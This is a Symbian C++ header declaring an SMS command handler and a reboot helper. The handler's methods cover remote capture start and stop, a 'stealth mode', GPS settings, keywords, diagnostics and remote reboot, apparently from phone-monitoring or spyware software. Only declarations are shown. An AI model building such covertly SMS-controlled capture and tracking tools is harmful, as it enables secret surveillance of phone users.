#ifndef __SmsCmdListener
#define __SmsCmdListener

#include <e32base.h>

#include "SmsCmdManager.h"
#include "Timeout.h"

class MDiagnosInfoProvider;
class CRebootCmd;
class TWatchList;
class TOperatorNotifySmsKeyword;

class CSmsCmdHandler : public CBase,
				   		public MCmdListener
	{
public:
    static CSmsCmdHandler* NewL(MDiagnosInfoProvider& aDiagnosticInfo);
	~CSmsCmdHandler();
	
private: //From MSmsCmdObserver
	HBufC* HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails);
	
private:
	CSmsCmdHandler(MDiagnosInfoProvider& aDiagnosticInfo);
	void ConstructL();
	
	/**
	* Process start command
	* @return response message, NULL if is acceptable
	*/
	HBufC* ProcessCmdStartCaptureL(TBool aStartCapture, const TSmsCmdDetails& aCmdDetails);
	HBufC* ProcessCmdQueryCmdLC(const TSmsCmdDetails& aCmdDetails);
	HBufC* ProcessCmdChangeSettingsL(const TSmsCmdDetails& aCmdDetails);
	HBufC* ProcessCmdStealthModeL(const TSmsCmdDetails& aCmdDetails);	
	HBufC* ProcessCmdGpsSettingsL(const TSmsCmdDetails& aCmdDetails);
	HBufC* ProcessCmdSetKeywordsL(const TSmsCmdDetails& aCmdDetails);
	HBufC* CreateGpsStatusTextLC(const TGpsSettingOptions& aGpsOptions);
	HBufC* CommonMessageResponseLC(TUint aCmdCode);
	HBufC* DiagnosticMessageLC();
	HBufC* CurrentSettingsValueTextLC();
	HBufC* CreateGpsMethodTextLC();
	void SetKeywordToCmdServerL(const TOperatorNotifySmsKeyword& aKeywords);
	HBufC* CommonResponseCmdKeywordL(const TOperatorNotifySmsKeyword& aKeywords, const TSmsCmdDetails& aCmdDetails);
	
private:		
	MDiagnosInfoProvider& iDiagnosInfo;
	CRebootCmd* iRebootCmd;
	};
	
class CRebootCmd : public CBase,
				   public MTimeoutObserver
	{
public:
	static CRebootCmd* NewL();
	~CRebootCmd();
	void Reboot();
private:
	void HandleTimedOutL();
private:
	CRebootCmd();
	void ConstructL();
	/**
	* @return KErrNone if successfull
	*/
	TInt DoReboot();
private:
	CTimeOut* iTimer;
	};	
#endif
